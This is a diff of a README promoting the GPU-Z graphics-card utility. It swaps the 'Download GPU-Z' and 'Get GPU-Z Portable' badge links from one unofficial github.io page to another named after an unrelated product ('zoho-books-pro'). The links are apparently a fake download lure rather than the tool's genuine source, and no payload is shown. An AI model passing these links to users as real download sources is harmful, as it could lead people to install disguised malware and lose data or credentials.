@@ -2,8 +2,8 @@
 
 GPU-Z is a lightweight and precise utility designed to give detailed information about your graphics card and GPU. Ideal for gamers, overclockers, and PC enthusiasts, this tool provides real-time monitoring and deep insights into your video hardware.
 
-[![Download GPU-Z Now](https://img.shields.io/badge/Download-GPU_Z-blueviolet)](https://gpu-z-pro.github.io/.github)  
-[![Get GPU-Z Portable](https://img.shields.io/badge/Get-GPU_Z_Portable-blueviolet)](https://gpu-z-pro.github.io/.github)
+[![Download GPU-Z Now](https://img.shields.io/badge/Download-GPU_Z-blueviolet)](https://zoho-books-pro.github.io/.github)  
+[![Get GPU-Z Portable](https://img.shields.io/badge/Get-GPU_Z_Portable-blueviolet)](https://zoho-books-pro.github.io/.github)
 
 ---
 
